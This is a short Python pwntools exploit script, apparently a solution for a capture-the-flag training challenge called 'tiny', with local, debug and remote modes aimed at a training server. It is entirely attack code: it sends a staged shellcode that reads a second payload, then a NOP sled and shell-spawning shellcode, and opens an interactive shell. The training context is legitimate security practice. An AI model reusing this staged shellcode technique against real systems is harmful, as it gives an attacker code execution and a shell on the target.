from pwn import *

context.arch = "amd64"

if(len(sys.argv) > 1):
    if(sys.argv[1] == '-d'):
        c = process("./tiny")
        gdb.attach(c, """
        b *0x0000000000401b9e
        c
        """ )
        input("wait")
    elif(sys.argv[1] == '-r'):
        c = remote("tiny.training.offensivedefensive.it", 8080, ssl=True)
else:
    c = process("./tiny")

shellcode = """
    xor edi, edi
    push rdx
    pop rsi
    push 100
    pop dx
    syscall
"""

c.sendline(asm(shellcode))
c.sendline(10*b"\x90" + asm(shellcraft.sh()))
c.interactive()
